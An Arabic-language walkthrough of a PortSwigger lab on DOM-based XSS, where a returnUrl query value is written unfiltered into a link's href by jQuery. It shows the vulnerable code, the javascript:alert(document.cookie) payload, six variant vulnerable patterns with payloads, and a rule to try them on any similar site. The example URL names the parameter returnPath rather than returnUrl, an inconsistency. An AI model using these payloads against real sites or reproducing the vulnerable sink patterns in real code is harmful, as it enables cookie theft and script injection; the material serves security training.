# [DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

## 1. وصف اللاب

اللاب يحتوي على ثغرة **DOM-Based XSS** في صفحة "Submit Feedback". يتم أخذ قيمة من:

```
location.search
```

ثم يتم تمرير هذه القيمة إلى jQuery من خلال:

```javascript
$('#backLink').attr('href', returnUrl);
```

وبالتالي أي قيمة يتم وضعها في بارامتر:

```
?returnUrl=
```

تُستخدم مباشرة داخل الـ `href` بدون فلترة.

---

## 2. أين تقع الثغرة؟

الكود   بالشكل التالي:

```javascript
var returnUrl = new URLSearchParams(location.search).get('returnUrl');
$('a#backLink').attr('href', returnUrl);
```

هذا يعني أنّ الرابط "Back" يقوم بتحديث الـ **href** من قيمة المستخدم مباشرة.

إذا وضع المهاجم قيمة تبدأ بـ:

```
javascript:
```

فسيقوم jQuery بوضعها كما هي داخل الرابط، وعند الضغط عليه يتم تنفيذ الجافاسكربت.

---

## 3. الهدف من اللاب

جعل رابط **Back** يُنفّذ:

```
alert(document.cookie)
```

عند الضغط عليه.

---

## 4. الـ Payload

ضع في الرابط:

```
?returnUrl=javascript:alert(document.cookie)
```
مثال كامل:

```


https://0a7800bb04717307803fadbf00380035.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

---

## 5. لماذا يعمل هذا الهجوم؟

* jQuery يسمح بوضع أي قيمة داخل الـ href باستخدام `.attr()`.
* إذا كانت القيمة تبدأ بـ `javascript:` سيتعامل معها المتصفح كرابط جافاسكربت.
* عند الضغط على الرابط يتم تنفيذ الكود داخل المتصفح.
* لا يوجد أي فلترة أو sanitization على بارامتر `returnUrl`.

---

## 6. الخلاصة

* نوع الهجوم: **DOM XSS (jQuery href injection)**.
* نقطة الضعف: `.attr('href', user_input)`.
* المصدر: `location.search`.
* Payload الحل:

```
javascript:alert(document.cookie)
```

* التنفيذ يتم عند الضغط على الرابط

---

# سيناريوهات مختلفة لنفس الفكرة

هذه سيناريوهات مختلفة قد تراها في أي لاب أو موقع، وجميعها تعتمد على نفس مبدأ: **حقن user input داخل href**.

---

## السيناريو 1: DOM XSS عبر `element.href = userInput`

```javascript
var next = decodeURIComponent(location.hash.substr(1));
document.getElementById('profile').href = next;
```

الحل:

```
#javascript:alert(1)
```

---

## السيناريو 2: DOM XSS عبر jQuery `.attr("href")`

```javascript
var link = getParam("redirect");
$("#btn").attr("href", link);
```

الحل:

```
?redirect=javascript:alert(1)
```

---

## السيناريو 3: DOM XSS عند استخدام `window.location = userInput`

```javascript
var u = userInput;
window.location = u;
```

الحل:

```
javascript:alert(1)
```

---

## السيناريو 4: DOM XSS عبر `setAttribute('href')`

```javascript
var returnTo = getParam('return');
document.querySelector('#goBack').setAttribute('href', returnTo);
```

الحل:

```
?return=javascript:alert(document.cookie)
```

---

## السيناريو 5: DOM XSS عبر `href` داخل Template Literal

```javascript
var r = location.search.split('link=')[1];
document.getElementById('b').innerHTML = `<a href="${r}">Back</a>`;
```

الحل:

```
?link=javascript:alert(1)
```

---

## السيناريو 6: DOM XSS عبر hash routing

```javascript
var route = location.hash.replace('#','');
$('a#router').attr('href', route);
```

الحل:

```
#javascript:alert(1)
```

---

# القاعدة العامة لحل أي سيناريو مشابه

إذا رأيت أي من الآتي:

* `.attr('href', userInput)`
* `element.href = userInput`
* `setAttribute('href', userInput)`
* `<a href="${userInput}">`

وكان **userInput** = قيمة من المستخدم بدون فلترة → جرب فورًا:

```
javascript:alert(1)
```

وإن احتجت الوصول للكوكي:

```
javascript:alert(document.cookie)
```

---
